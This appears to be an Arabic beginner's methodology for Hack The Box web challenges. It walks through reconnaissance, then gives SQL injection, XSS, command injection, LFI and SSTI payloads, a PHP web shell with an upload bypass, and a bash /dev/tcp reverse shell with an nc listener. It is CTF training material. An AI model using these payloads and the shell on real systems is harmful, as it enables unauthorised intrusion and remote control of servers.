# 🕸 Web Exploitation Methodology for HTB (Beginner-Friendly)

## ⚠️ مقدمة
هذا الملف يقدم لك ميثودولوجية (منهجية) كاملة لحل تحديات **Hack The Box** المتعلقة باختبار اختراق المواقع (Web Exploitation). مناسب للمبتدئين، كل خطوة مشروحة بتفصيل عميق عشان تفهم مو بس تطبق.

---

## ✅ 1. جمع المعلومات (Reconnaissance)

### 🔹 1.1 فحص البورتات
نستخدم أداة `nmap` عشان نعرف البورتات المفتوحة على السيرفر:

```bash
sudo nmap -sS -sV -sC -A -T4 -Pn -p- -oN web_scan.txt <IP>
```

- `-p-` : يفحص كل البورتات (1 إلى 65535)
- `-sS` : يعمل فحص SYN (سريع وخفي)
- `-Pn` : يتجاهل فحص الـ ping (لو كان الجهاز يحجب الـ ping)
- `-T4` : لتسريع الفحص


### 🔹 1.2 فحص الخدمات الموجودة على البورتات
بعد ما نعرف البورتات، نستخدم هذا الأمر لمعرفة نوع الخدمات والإصدارات:

- `-sC` : يشغل سكربتات nmap الافتراضية
- `-sV` : يتعرف على إصدار كل خدمة
- `-oN` : لحفظ النتائج في ملف

### 🔹 1.3 استكشاف الملفات والمجلدات
نستخدم أدوات مثل `ffuf` أو `feroxbuster` للبحث عن صفحات مخفية:

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt
```

- `-w` : تحدد قائمة الكلمات لتجريبها
- `-e` : إضافات الملفات الممكنة

### 🔹 1.4 معرفة التقنيات المستخدمة
```bash
whatweb <IP>
wafw00f <IP>
```

- `whatweb` : يخبرك إذا الموقع يستخدم WordPress أو Laravel أو غيره.
- `wafw00f` : يكشف إذا فيه Web Application Firewall يحجب الطلبات.

---

## 🔍 2. تحليل منطق الموقع

- افتح الموقع في المتصفح، وشغّل أدوات المطور (DevTools):
  - Network → راقب الاتصالات
  - Console → تظهر أخطاء الجافاسكربت
  - Cookies & Local Storage → يمكن فيها توكن أو صلاحيات

- اقرأ كود HTML جيداً، مرات يكتبون فيه تعليقات مهمة.

---

## 🔐 3. تجاوز تسجيل الدخول (Authentication Bypass)

- جرب إدخال SQL Injection في الحقول:

```
' OR '1'='1 --
' OR '1'='1 --#
etc...
```

- جرب أسماء مستخدمين وكلمات مرور معروفة:
  - admin:admin
  - guest:guest

- جرب استخدام أدوات مثل Burp Suite لاعتراض وتعديل الطلبات.

---

## 🧪 4. اختبار الحقول يدوياً (Manual Testing)

- XSS:
```html
<script>alert(1)</script>
```

- Command Injection:
```
127.0.0.1;id
"username":"sb3lr; id;"
```

- LFI:
```
../../../../etc/passwd
```

- SSTI (Server Side Template Injection):
```
{{7*7}} أو ${7*7}
```

- تحقق من الهيدرز:
  - X-Forwarded-For
  - Host

---

## 🧷 5. تحليل ملفات JavaScript

```bash
curl http://<IP>/js/app.js
```

- شوف هل فيه endpoints مخفية أو توكنات أو كلمات مرور.

---

## 📤 6. ثغرات رفع الملفات

لو فيه مكان ترفع فيه ملف:
- جرب ترفع shell بامتداد `.php`
- جرب خداع الفلتر بأسماء مثل:
  - `shell.php.jpg`
  - `shell.phtml`

محتوى shell بسيط:

```php
<?php system($_GET['cmd']); ?>
```

ثم تنفذه:

```bash
curl http://<IP>/uploads/shell.php?cmd=id
```

---

## 🍪 7. التلاعب بالكوكيز (Cookies)

- إذا الكوكي مشفر بـ Base64، افكه وشف المحتوى.
- إذا الكوكي JWT، جرب تعدل الـ payload.
- مرات الكوكي يحتوي role=admin أو user_id.

---

## 🧱 8. هل الموقع CMS معروف؟

- WordPress؟ استعمل:

```bash
wpscan --url http://<IP> --enumerate u
```

- Joomla؟ استعمل:
```bash
droopescan scan joomla -u http://<IP>
```

---

## 🧠 9. الوصول الأولي (Initial Access)

لو حصلت استغلال ناجح (XSS, File Upload, RCE)، حاول تجيب **Reverse Shell**:

```bash
bash -i >& /dev/tcp/<YourIP>/4444 0>&1
```

وفي جهازك:
```bash
nc -lvnp 4444
```

---

## 🔼 10. تصعيد الصلاحيات (Web Privilege Escalation)

بعد ما تدخل:
- شوف الملفات القابلة للقراءة (config.php, .env)
- هل فيه ملفات dev؟ أو سكربتات نسوا يحذفوها؟
- هل فيه cron job تستدعي سكربت قابل للتعديل؟

---

## 🏁 11. الحصول على الـ Flags

- `user.txt` دايمًا يكون في `/home/<user>/`
- `root.txt` دايمًا يكون في `/root/`

استخدم `cat` لقراءتهم.

---

## 🧰 أدوات ثابتة

| المرحلة | الأدوات |
|---------|---------|
| فحص البورتات | nmap |
| اكتشاف الملفات | ffuf, feroxbuster |
| اختبار يدوي | Burp Suite, curl |
| فحص CMS | wpscan, droopescan |
| Shells | nc, revshells.com |
| قراءة ملفات | cat, strings, grep |

---

## ✅ نصيحة أخيرة

لا تحفظ الثغرات، افهم المنطق. كل ما فهمت كيف المبرمج أخطأ، كل ما قدرت تستغل بسهولة.

---
